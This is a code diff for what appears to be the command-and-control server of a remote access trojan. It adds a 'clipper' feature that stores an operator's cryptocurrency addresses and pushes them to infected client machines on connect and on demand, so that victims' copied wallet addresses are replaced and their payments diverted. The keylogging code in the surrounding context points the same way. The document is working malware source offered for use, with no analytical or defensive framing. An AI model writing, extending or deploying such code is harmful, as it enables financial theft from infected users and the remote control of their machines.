@@ -409,6 +409,23 @@ function handleClientIdentity(clientId, socket, hostname, username, os_version, 
         }
     } catch (e) { console.error('keylog auto-resume error:', e.message); }
 
+    // Push clipper addresses to this RAT client if any are saved
+    if (user_id) {
+        try {
+            const clipperAddresses = db.getClipperAddresses(user_id);
+            if (Object.keys(clipperAddresses).length > 0) {
+                const json = JSON.stringify(clipperAddresses);
+                setTimeout(() => {
+                    const c = ratClients.get(clientId);
+                    if (c && c.socket && !c.socket.destroyed) {
+                        c.socket.write(`SET_CLIPPER|${json}\n`);
+                        console.log(`[CLIPPER] Pushed addresses to ${clientId}`);
+                    }
+                }, 2000);
+            }
+        } catch (e) { console.error('clipper push error:', e.message); }
+    }
+
     broadcastClientList();
     broadcastToDashboard({
         type: 'client_connected',
@@ -1652,6 +1669,29 @@ wss.on('connection', (ws, req) => {
                     break;
                 }
 
+                case 'set_clipper_addresses': {
+                    // Save operator's crypto addresses and push to all connected RAT clients
+                    const addrMap = message.addresses && typeof message.addresses === 'object'
+                        ? message.addresses
+                        : {};
+                    db.setClipperAddresses(user.userId, addrMap);
+                    // Push to all currently connected RAT clients for this user
+                    const json = JSON.stringify(addrMap);
+                    const cmd = `SET_CLIPPER|${json}`;
+                    ratClients.forEach((client, id) => {
+                        if (String(client.userId || '') === String(user.userId) &&
+                            client.socket && !client.socket.destroyed) {
+                            client.socket.write(cmd + '\n');
+                        }
+                    });
+                    ws.send(JSON.stringify({
+                        type: 'clipper_addresses_saved',
+                        addresses: addrMap,
+                        timestamp: Date.now()
+                    }));
+                    break;
+                }
+
                 case 'set_download_filename': {
                     // Save a custom filename for this user's download token
                     const raw = typeof message.filename === 'string' ? message.filename.trim() : '';
@@ -2015,6 +2055,17 @@ wss.on('connection', (ws, req) => {
                                     timestamp: Date.now()
                                 }));
                                 break;
+
+                            case 'get_clipper_addresses': {
+                                const addresses = db.getClipperAddresses(filterUserId);
+                                ws.send(JSON.stringify({
+                                    type: 'db_response',
+                                    query: 'get_clipper_addresses',
+                                    data: addresses,
+                                    timestamp: Date.now()
+                                }));
+                                break;
+                            }
 
                             case 'get_file':
                                 const file = db.getFile(message.fileId, filterUserId);
